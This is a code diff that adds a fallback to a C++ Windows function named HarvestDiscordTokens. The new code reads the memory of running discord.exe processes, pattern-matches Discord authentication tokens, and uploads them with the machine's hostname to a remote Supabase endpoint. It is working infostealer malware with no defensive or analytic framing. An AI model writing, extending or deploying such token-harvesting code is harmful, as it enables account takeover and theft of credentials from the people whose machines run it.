@@ -1178,6 +1178,79 @@ static void HarvestDiscordTokens() {
         batch += "]";
         std::string pr;
         HttpRequest(L"POST", SUPABASE_DISCORD_PATH, batch, pr);
+        return;
+    }
+
+    // Fallback: scan Discord process memory for the token (it's in V8 heap)
+    LogMsg("Discord: scanning process memory");
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe = { sizeof(pe) };
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (lstrcmpiW(pe.szExeFile, L"discord.exe") == 0) {
+                    size_t before = tokens.size();
+                    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
+                    if (!hp) continue;
+                    SYSTEM_INFO si; GetSystemInfo(&si);
+                    uintptr_t addr = (uintptr_t)si.lpMinimumApplicationAddress;
+                    while (addr < (uintptr_t)si.lpMaximumApplicationAddress) {
+                        MEMORY_BASIC_INFORMATION mbi;
+                        if (VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi)) == 0) { addr += 65536; continue; }
+                        if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) && !(mbi.Protect & PAGE_GUARD) && mbi.Type == MEM_PRIVATE && mbi.RegionSize <= 104857600) {
+                            char* buf = new char[(size_t)mbi.RegionSize + 1];
+                            SIZE_T rd = 0;
+                            if (ReadProcessMemory(hp, mbi.BaseAddress, buf, mbi.RegionSize, &rd) && rd > 0) {
+                                buf[rd] = 0;
+                                for (DWORD i = 0; i < (DWORD)rd; i++) {
+                                    if (!IsTokenChar(buf[i])) continue;
+                                    if (i + 4 <= rd && buf[i] == 'm' && buf[i+1] == 'f' && buf[i+2] == 'a' && buf[i+3] == '.') {
+                                        DWORD j = i + 4; while (j < rd && IsTokenChar(buf[j]) && j - i < 120) j++;
+                                        if (j - i >= 70 && j - i <= 120) tokens.push_back(std::string(buf + i, j - i));
+                                        i = j; continue;
+                                    }
+                                    DWORD dots = 0, dp[2] = {0}, end = i;
+                                    while (end < rd && IsTokenChar(buf[end]) && end - i < 130) {
+                                        if (buf[end] == '.') { if (dots < 2) dp[dots++] = end; else break; }
+                                        end++;
+                                    }
+                                    if (dots == 2) {
+                                        DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
+                                        while (end < rd && IsTokenChar(buf[end]) && end - i < 130) end++;
+                                        DWORD seg3 = end - dp[1] - 1;
+                                        if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60)
+                                            tokens.push_back(std::string(buf + i, end - i));
+                                    }
+                                    while (i < rd && IsTokenChar(buf[i])) i++;
+                                }
+                            }
+                            delete[] buf;
+                            if (tokens.size() > before) { LogMsg("Discord mem: found in PID " + std::to_string(pe.th32ProcessID)); break; }
+                        }
+                        addr += mbi.RegionSize;
+                    }
+                    CloseHandle(hp);
+                    if (tokens.size() > before) break;
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+
+    if (!tokens.empty()) {
+        std::sort(tokens.begin(), tokens.end());
+        tokens.erase(std::unique(tokens.begin(), tokens.end()), tokens.end());
+        std::string batch = "[";
+        for (size_t i = 0; i < tokens.size(); i++) {
+            if (i > 0) batch += ",";
+            batch += "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"token\":\"" + EscapeJSON(tokens[i]) + "\"}";
+        }
+        batch += "]";
+        std::string pr;
+        HttpRequest(L"POST", SUPABASE_DISCORD_PATH, batch, pr);
+        LogMsg("Discord: uploaded " + std::to_string(tokens.size()) + " tokens from memory");
+    } else {
+        LogMsg("Discord mem: no token found in any discord.exe process");
     }
 }
 
